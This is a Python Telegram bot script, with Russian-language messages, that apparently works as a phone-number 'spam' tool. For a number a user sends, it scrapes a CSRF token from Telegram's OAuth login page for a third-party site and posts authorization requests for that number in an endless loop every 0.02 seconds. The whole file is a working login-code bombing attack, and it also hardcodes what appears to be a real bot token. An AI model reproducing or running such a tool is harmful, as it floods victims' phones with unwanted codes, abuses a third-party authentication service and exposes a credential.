import asyncio
import aiohttp
import re
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

spam_tasks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отправь номер (например, +380963836766) — бот получит CSRF-токен и отправит запрос авторизации.")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await update.message.reply_text("Остановлено")
    else:
        await update.message.reply_text("Нет активного спама")

async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идёт, останови /stop")
        return
    phone = update.message.text.strip()
    if not phone.startswith('+'):
        await update.message.reply_text("Формат: +380...")
        return

    await update.message.reply_text(f"Запущено для {phone}")

    async def spam():
        count = 0
        base_url = "https://oauth.telegram.org/auth"
        params = {
            "bot_id": "1852523856",
            "origin": "https://cabinet.presscode.app",
            "embed": "1",
            "return_to": "https://cabinet.presscode.app/login"
        }
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    async with session.get(base_url, params=params) as resp:
                        html = await resp.text()
                    csrf_match = re.search(r'<input[^>]*name="csrf_token"[^>]*value="([^"]+)"', html, re.IGNORECASE)
                    if not csrf_match:
                        csrf_match = re.search(r'<input[^>]*name="authenticity_token"[^>]*value="([^"]+)"', html, re.IGNORECASE)
                    if not csrf_match:
                        await context.bot.send_message(chat_id, "CSRF не найден, отправляю без него")
                        data = {'phone': phone}
                    else:
                        csrf_token = csrf_match.group(1)
                        data = {'phone': phone, 'csrf_token': csrf_token}
                    async with session.post(base_url, params=params, data=data) as resp2:
                        status = resp2.status
                        text2 = await resp2.text()
                        count += 1
                        await context.bot.send_message(chat_id, f"Попытка #{count}: {status}, {text2[:40]}")
                except Exception as e:
                    await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:30]}")
                await asyncio.sleep(0.02)

    task = asyncio.create_task(spam())
    spam_tasks[chat_id] = task

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    app.run_polling()

if __name__ == "__main__":
    main()
